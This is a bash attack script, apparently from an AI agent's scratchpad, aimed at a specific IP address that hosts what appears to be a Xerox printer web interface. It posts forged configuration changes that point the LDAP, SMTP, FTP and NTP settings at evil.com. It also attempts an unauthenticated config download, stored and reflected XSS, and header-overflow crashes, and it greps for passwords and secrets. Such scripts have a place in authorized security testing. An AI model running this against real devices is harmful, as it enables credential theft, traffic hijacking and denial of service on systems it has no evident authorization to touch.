#!/bin/bash
# Focused Retest - High Value Targets
# Run AFTER connectivity recovers. Slower pace to avoid exhaustion.
TARGET="13.13.1.110"
PROXY="127.0.0.1:34153"
OUTDIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/retest_results"
mkdir -p "$OUTDIR"

fetch_get() {
  local path="$1"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_post() {
  local path="$1"
  local body="$2"
  local content_type="${3:-application/x-www-form-urlencoded}"
  local len=${#body}
  (echo -e "POST $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: $content_type\r\nContent-Length: $len\r\n\r\n$body"; sleep 3) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

echo "[*] Connectivity check..."
resp=$(fetch_get "/stat/welcome.php")
if [ -z "$resp" ]; then
  echo "[!] Target not responding. Try again later."
  exit 1
fi
echo "[+] Target is up: $(echo "$resp" | head -1)"

# Fresh CSRF token
CSRF_TOKEN=$(echo "$resp" | grep -oP '[a-f0-9]{64,}' | head -1)
echo "[*] CSRF Token: ${CSRF_TOKEN:0:20}..."

echo ""
echo "=== TEST A: SSRF via LDAP configuration change ==="
# Try to set LDAP server to external address
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_LDAP_fn&ldapServerAddress=evil.com&ldapPort=389&ldapBaseDN=dc=evil,dc=com"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "LDAP change: $(echo "$resp" | head -1)"
echo "$resp" | grep -i "script\|redirect\|error\|success" | head -3
echo "$resp" > "$OUTDIR/ssrf_ldap.txt"

echo ""
echo "=== TEST B: SSRF via SMTP configuration ==="
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_Email_fn&smtpServer=evil.com&smtpPort=25&emailFrom=test@evil.com"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "SMTP change: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/ssrf_smtp.txt"

echo ""
echo "=== TEST C: SSRF via FTP configuration ==="
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_FTP_fn&ftpServer=evil.com&ftpPort=21"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "FTP change: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/ssrf_ftp.txt"

echo ""
echo "=== TEST D: Config download without auth ==="
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Download_Config_fn&NextPage=/properties/backupRestore.php"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "Config download: $(echo "$resp" | head -1)"
body_len=$(echo "$resp" | wc -c)
echo "Response size: ${body_len} bytes"
if [ "$body_len" -gt 5000 ]; then
  echo "[!] Large response - may contain config data!"
fi
echo "$resp" > "$OUTDIR/config_download.txt"

echo ""
echo "=== TEST E: Device name XSS via xerox.set ==="
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_DeviceName_fn&deviceName=%3Cscript%3Ealert(1)%3C/script%3E"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "Device name XSS: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/xss_devicename.txt"
# Check if it was set
sleep 3
resp2=$(fetch_get "/stat/welcome.php")
echo "$resp2" | grep -i "script\|alert(1)" | head -3
if echo "$resp2" | grep -qi "<script>alert(1)</script>"; then
  echo "[!!] STORED XSS VIA DEVICE NAME!"
fi

echo ""
echo "=== TEST F: NTP server SSRF ==="
sleep 3
BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_NTP_fn&ntpServer=evil.com"
resp=$(fetch_post "/dummypost/xerox.set" "$BODY")
echo "NTP change: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/ssrf_ntp.txt"

echo ""
echo "=== TEST G: Authorization header overflow (isolated test) ==="
sleep 3
for size in 256 512 1024 2048 4096; do
  val=$(python3 -c "print('A'*$size)")
  resp=$((echo -e "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\nAuthorization: Basic ${val}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null)
  status=$(echo "$resp" | head -1)
  resp_len=$(echo "$resp" | wc -c)
  echo "  Auth header $size: $status (${resp_len} bytes)"
  if [ "$resp_len" -lt 10 ]; then
    echo "  [!] NO RESPONSE for Authorization header size $size!"
    echo "NO_RESPONSE" > "$OUTDIR/auth_overflow_${size}.txt"
    break
  fi
  sleep 2
done

echo ""
echo "=== TEST H: Configuration report for sensitive data ==="
sleep 3
resp=$(fetch_get "/stat/welcome.php?tab=configurationReport")
echo "$resp" | grep -i "password\|secret\|key\|credential\|ldap\|smtp\|snmp\|community\|kerberos" | grep -v "script\|css\|label\|translate" | head -20 > "$OUTDIR/config_sensitive.txt"
lines=$(wc -l < "$OUTDIR/config_sensitive.txt")
echo "Sensitive data matches: $lines lines"
if [ "$lines" -gt 0 ]; then
  cat "$OUTDIR/config_sensitive.txt"
fi

echo ""
echo "=== TEST I: Error page parameter manipulation ==="
sleep 3
# Test if error.php token parameter is injectable
resp=$(fetch_get "/error.php?token=<script>alert(1)</script>")
echo "$resp" | grep -i "script\|alert" | grep -v "jquery\|document\.\|function\|\.js\|var " | head -5
echo "$resp" > "$OUTDIR/error_xss.txt"

echo ""
echo "=== RETEST COMPLETE ==="
echo "Results in: $OUTDIR/"
